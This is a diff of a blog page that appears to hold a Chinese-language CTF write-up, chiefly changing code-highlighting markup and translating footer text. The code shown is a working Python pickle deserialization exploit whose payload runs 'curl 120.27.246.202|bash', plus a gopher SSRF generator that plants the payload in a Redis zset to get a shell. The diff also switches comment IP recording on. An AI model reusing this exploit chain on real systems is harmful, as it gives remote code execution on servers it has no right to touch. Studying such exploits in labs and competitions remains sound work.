-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = <span class="string">"""curl 120.27.246.202|bash"""</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e,protocol=<span class="number">2</span>)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import pickle
+import os
+
+class exp(object):
+    def __reduce__(self):
+        s = &quot;&quot;&quot;curl 120.27.246.202|bash&quot;&quot;&quot;
+        return (os.system, (s,))
+
+e = exp()
+s = pickle.dumps(e,protocol=2)
+print(s)
+</code></pre>
 <p>python2 运行 convert.py<br>注意我们执行的是zadd。因为之前本地已经知道了requests是zset类型数据。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_key</span><span class="params">(key,payload)</span>:</span></span><br><span class="line">    cmd=[</span><br><span class="line">    <span class="string">"zadd &#123;0&#125; 1 &#123;1&#125;"</span>.format(key,payload),</span><br><span class="line">    <span class="string">"quit"</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x)))+CRLF+x</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_payload</span><span class="params">()</span>:</span></span><br><span class="line">    key = <span class="string">"byte:requests"</span></span><br><span class="line">    payload =<span class="string">"""\x80\x02cposix\nsystem\nq\x00X\x18\x00\x00\x00curl 120.27.246.202|bashq\x01\x85q\x02Rq\x03."""</span>.replace(<span class="string">' '</span>,<span class="string">'\x12'</span>)</span><br><span class="line">    cmd=set_key(key,payload)</span><br><span class="line">    protocol=<span class="string">"gopher://"</span></span><br><span class="line"></span><br><span class="line">    ip=<span class="string">"172.20.0.7"</span></span><br><span class="line">    port=<span class="string">"6379"</span></span><br><span class="line"></span><br><span class="line">    payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += quote(redis_format(x).replace(<span class="string">"^"</span>,<span class="string">" "</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    passwd = <span class="string">''</span></span><br><span class="line">    p=generate_payload()</span><br><span class="line">    print(p.replace(<span class="string">'%12'</span>,<span class="string">'%20'</span>))</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from urllib import quote
+
+def set_key(key,payload):
+    cmd=[
+    &quot;zadd {0} 1 {1}&quot;.format(key,payload),
+    &quot;quit&quot;
+    ]
+    return cmd
+
+def redis_format(arr):
+    CRLF=&quot;\r\n&quot;
+    redis_arr = arr.split(&quot; &quot;)
+    cmd=&quot;&quot;
+    cmd+=&quot;*&quot;+str(len(redis_arr))
+    for x in redis_arr:
+        cmd+=CRLF+&quot;$&quot;+str(len((x)))+CRLF+x
+    cmd+=CRLF
+    return cmd
+
+
+def generate_payload():
+    key = &quot;byte:requests&quot;
+    payload =&quot;&quot;&quot;\x80\x02cposix\nsystem\nq\x00X\x18\x00\x00\x00curl 120.27.246.202|bashq\x01\x85q\x02Rq\x03.&quot;&quot;&quot;.replace(&#39; &#39;,&#39;\x12&#39;)
+    cmd=set_key(key,payload)
+    protocol=&quot;gopher://&quot;
+
+    ip=&quot;172.20.0.7&quot;
+    port=&quot;6379&quot;
+
+    payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
+
+    for x in cmd:
+        payload += quote(redis_format(x).replace(&quot;^&quot;,&quot; &quot;))
+    return payload
+
+if __name__==&quot;__main__&quot;:
+    passwd = &#39;&#39;
+    p=generate_payload()
+    print(p.replace(&#39;%12&#39;,&#39;%20&#39;))</code></pre>
 <p>一个小坑是我的空格总是会被错转。于是干脆先把空格填充一下最后再换回<code>%20</code>即可。</p>
 <p>打本地成了后，远程必然没有问题了。<br>最后因为get传参,我们注意二次url编码即可。执行命令<code>curl xxx|bash</code><br>(读文件确认有bash,pycurl确认有curl,同时之前把命令往tmp下写时发现有readflag)</p>
 <p>getshell :)<br><img src="https://i.imgur.com/7afkg9s.png" class="lazyload" data-srcset="https://i.imgur.com/7afkg9s.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
@@ -763,7 +953,7 @@ signi...</p>
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -775,9 +965,9 @@ signi...</p>
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -910,6 +1100,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1123,7 +1315,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1179,6 +1371,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
